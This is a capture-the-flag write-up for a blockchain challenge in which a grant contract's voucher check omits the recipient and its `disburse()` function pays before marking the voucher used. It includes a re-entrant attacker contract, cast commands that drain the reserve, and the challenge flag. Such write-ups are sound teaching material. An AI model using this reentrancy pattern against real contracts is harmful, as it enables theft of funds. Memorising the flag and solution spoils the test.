# Standing Order

Standing Order is a blockchain challenge worth 70 points (151 solves). A grant program pays out ETH against vouchers signed off chain by a committee, and it offers two redemption entry points that share one signature check. Each team gets a private chain, a funded key, the `Setup` address, and a committee-signed voucher handed over as three values. The win condition is that the program's 20 ETH reserve ends below 1% of its starting balance.

## What you are given

`standing-order-player.zip` unpacks to a self-contained Foundry project:

```
standing-order/README.md
standing-order/foundry.toml          solc 0.8.24, optimizer on, evm_version cancun
standing-order/contracts/Setup.sol         deploys and funds the program, exposes isSolved()
standing-order/contracts/Disbursement.sol  the program itself
```

There is no web interface. The portal supplies `<rpc-url>`, `<player-key>` and the `<setup-address>`, plus `voucher_amount`, `voucher_nonce` and `voucher_signature`. Those three values are also readable on chain through `Setup.voucher()`, `voucherAmount()`, `voucherNonce()` and `voucherSignature()`, so the handout and the chain cannot disagree.

The extracted tree in the challenge directory also holds `contracts/Drain.sol`, a small attacker contract written during the event. It is not part of the handout zip, and it is described here only as the shape of the exploit, not as supplied material.

## Reproduction

1. Read the two payment paths together. `Disbursement` defines `acknowledge()` for onboarding credits and `disburse()` for committee approvals, and both call the same two helpers, `voucherDigest` and `_recoverSigner`. Nothing in either path is role-gated: holding the voucher is the whole authorisation.

2. Look at what the digest commits to.

   ```solidity
   function voucherDigest(uint256 amount, uint256 nonce) public pure returns (bytes32) {
       return keccak256(abi.encodePacked(amount, nonce));
   }
   ```

   The digest covers the amount and the nonce. It does not cover the recipient, the entry point, this contract's address, or the chain id. So one committee approval is not bound to one payout address and not bound to one function.

3. Compare the two function bodies, line by line. `acknowledge()` sets `voucherUsed[digest] = true` and then calls the recipient. `disburse()` calls the recipient and then sets `voucherUsed[digest] = true`. The source comments label both orderings in plain words, which is the hint: the correct sequence and the broken one sit in the same file, one function apart.

4. Read the instance parameters off `Setup`. `RESERVE` is 20 ether, `VOUCHER_AMOUNT` is 1 ether, `VOUCHER_NONCE` is 0, and `voucher()` returns all three values at once. `_recoverSigner` hashes the digest under the `"\x19Ethereum Signed Message:\n32"` prefix, so the 65-byte blob is a standard personal-message signature. Nothing needs to be forged.

   ```
   $ cast call <setup-address> "voucher()(uint256,uint256,bytes)" --rpc-url <rpc-url>
   $ cast call <setup-address> "disbursement()(address)"         --rpc-url <rpc-url>
   ```

5. Deploy a recipient contract that carries the voucher and re-enters on receipt. The shape is small: one function that starts the redemption, and a `receive()` that calls back in while the balance still covers another 1 ETH payout.

   ```solidity
   function attack() external { d.disburse(address(this), amount, nonce, sig); }
   receive() external payable {
       if (address(d).balance >= amount) { d.disburse(address(this), amount, nonce, sig); }
   }
   ```

   Each nested call passes `require(!voucherUsed[digest])` because no frame has written the flag yet, and each pays 1 ETH to the attacker before returning.

6. Run it. The recursion stops when the program's balance drops below one voucher amount, so the last payout takes the reserve to exactly zero. The recorded run needed twenty recursive 1 ETH payouts against the 20 ETH reserve.

   ```
   $ cast send <attacker> "attack()" --rpc-url <rpc-url> --private-key <player-key>
   $ cast call <setup-address> "isSolved()(bool)" --rpc-url <rpc-url>
   true
   ```

7. Sweep the ETH out of the attacker contract and submit. `Setup.isSolved()` reads `address(disbursement).balance < RESERVE / 100`, which is 0.2 ether, and the reserve is 0.

## Why it works

Two separate omissions compound. The digest leaves out the recipient and the entry point, so a committee approval is a bearer instrument for an amount rather than an authorisation for a named payee: whoever holds the signature decides where the ETH goes. On its own that lets a holder redeem once to their own address instead of the intended one.

The ordering in `disburse()` then removes the once. Because `voucherUsed` is written after the external call, a contract recipient can call back into `disburse()` while the voucher is still marked unused. Every nested frame repeats the same check and the same payment, and the same single approval is spent twenty times. The recursion terminates naturally when the balance can no longer cover another payout, which is exactly the win condition.

`acknowledge()` would have closed this on its own: marking the voucher used before the transfer means the re-entrant frame fails the first `require`. The challenge is the inconsistency between two paths that were wired against the same signature check but not against the same ordering.

The local record for this challenge is a board note and the accepted submission, not a captured transaction log, so the attacker contract address, the transaction hash and the exact per-frame gas are not recorded. The mechanism, the reserve, the voucher parameters and the twenty-payout loop are recorded.

## Flag

```
hiCTF{one_sig_two_paths_then_the_l00p_5383acb880}
```
